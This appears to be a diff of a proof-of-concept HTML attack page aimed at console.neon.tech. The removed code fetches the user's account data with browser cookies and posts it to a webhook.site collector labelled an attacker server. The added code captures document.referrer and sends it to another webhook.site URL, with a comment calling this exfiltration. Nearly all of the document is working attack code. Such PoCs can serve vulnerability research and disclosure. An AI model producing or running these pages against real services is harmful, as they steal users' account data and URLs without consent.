@@ -1,23 +1,21 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Referrer Capture PoC</title>
+</head>
 <body>
-<h3>CSRF PoC - Neon User Data</h3>
-<script>
-  // Try to fetch user data with cookies
-  fetch("https://console.neon.tech/api/v2/users/me", {
-    credentials: "include"
-  })
-  .then(r => r.text())
-  .then(d => {
-    // Attempt exfiltration to attacker server
-    fetch("https://webhook.site/31610c4c-f3be-4956-8fe1-d51b5bfd470e", {
-      method: "POST",
-      body: d,
-      mode: "no-cors"
-    });
-    document.body.innerHTML += "<pre>" + d + "</pre>";
-  })
-  .catch(e => document.body.innerHTML += "Blocked: " + e);
-</script>
+  <h1>Referrer Header PoC</h1>
+  <p>Open this page right after logging into <code>console.neon.tech</code>.</p>
+
+  <script>
+    // Grab the referrer
+    const ref = document.referrer;
+
+    // Show it on screen
+    document.body.innerHTML += "<p><b>Referrer:</b> " + ref + "</p>";
+
+    // Exfiltrate to webhook.site (replace with your unique URL)
+    fetch("https://webhook.site/4a250e67-5bb6-40ef-8deb-372e1d7d2d39?ref=" + encodeURIComponent(ref));
+  </script>
 </body>
 </html>
